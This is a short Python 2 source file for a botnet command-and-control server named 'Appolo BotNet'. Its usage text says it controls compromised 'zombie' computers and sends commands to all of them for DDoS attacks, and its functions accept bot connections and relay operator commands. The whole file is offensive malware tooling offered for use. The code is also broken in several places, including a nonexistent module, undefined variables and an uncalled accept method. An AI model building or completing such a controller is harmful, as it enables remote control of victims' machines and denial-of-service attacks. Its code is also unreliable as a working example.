#Server
#Made by BoKode.inc

import socket
import os
import sys
import threads
import time
import random 
#import paramiko?

s = socket.socket()
Host = host
Port = 12345

zombies = []

def usage():
    print '''
            This is the Appolo BotNet used for Command and Control and all the other basic botnet functions.
            Code by BoKode.inc
            The controled computers are called zombies. Each Zombie is labeled something like "Zombie1" or "Zombie53".
            This can be used to make ddos attacks. To make a ddos attack for the target on send_command enter "all" and
            it sends the command to all the zombies
            '''

def client_connect():
    i_int = 1
    i = str(i_int)
    while True:
        s.listen(100)
        conn, addr = s.accept
        if client not in zombies:
            zombies.append(addr)
        conn.send(i)
        i_int += 1
        Greeting = conn.recv(1024)
        print Greeting
        time.sleep(random.randint(10,100))

def send_command():
    Target = raw_input("Enter Target ID: ")
    
    Cmd = raw_input("Enter Command: ")
    print "Sending command"
    try:
        conn.send(Cmd)
        print "Command Sent"
        Output = conn.recv(1024)
    except:
        print "Failed To Send Command"
    
def show_zombies():
    print zombies
